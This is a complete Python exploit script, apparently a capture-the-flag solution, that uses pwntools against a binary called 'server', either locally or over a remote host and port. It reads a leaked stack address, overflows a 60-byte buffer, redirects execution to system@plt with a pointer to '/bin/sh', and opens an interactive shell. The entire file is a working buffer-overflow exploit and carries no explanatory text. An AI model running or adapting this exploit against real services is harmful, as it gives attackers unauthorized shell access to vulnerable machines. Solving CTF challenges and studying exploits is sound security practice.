#!/usr/bin/env python3

from pwn import context, log, p32, remote, sys

context.binary = 'server'
elf = context.binary


def get_process():
    if len(sys.argv) == 1:
        return elf.process()

    host, port = sys.argv[1], int(sys.argv[2])
    return remote(host, port)


def main():
    p = get_process()

    p.recvuntil(b'address')
    p.recvline()

    stack_addr = int(p.recvline().split()[0].decode(), 16)
    log.info(f'Leaked an address on the stack: {hex(stack_addr)}')  

    offset = 60
    junk = b'A' * offset

    payload  = junk
    payload += p32(elf.plt.system)
    payload += p32(0)
    payload += p32(stack_addr + 0x48)
    payload += b'/bin/sh'

    p.sendlineafter(b'Input some text: ', payload)
    p.recvuntil(b'Return')
    p.recv()

    p.interactive()


if __name__ == '__main__':
    main()
